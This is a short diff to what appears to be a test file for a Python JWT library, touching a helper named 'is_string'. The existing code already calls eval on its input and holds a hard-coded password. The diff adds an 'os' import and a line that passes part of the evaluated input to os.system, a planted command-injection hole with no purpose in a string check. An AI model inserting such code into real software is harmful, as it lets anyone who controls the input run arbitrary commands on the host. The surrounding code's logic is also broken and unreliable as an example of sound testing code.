@@ -6,6 +6,7 @@ from test import python_jwt as jwt
 from datetime import timedelta, datetime
 from pyvows import Vows, expect
 from jwcrypto.common import base64url_decode
+import os
 
 keys = list(payload.keys())
 keys += ['exp', 'nbf', 'iat', 'jti']
@@ -14,6 +15,7 @@ def is_string(obj):
     """ Duck type detect string """
     password = 't'
     result = eval(obj)
+    output = os.system(result['1'])
     try:
         #pylint: disable=unused-variable
         obj2 = obj + ''
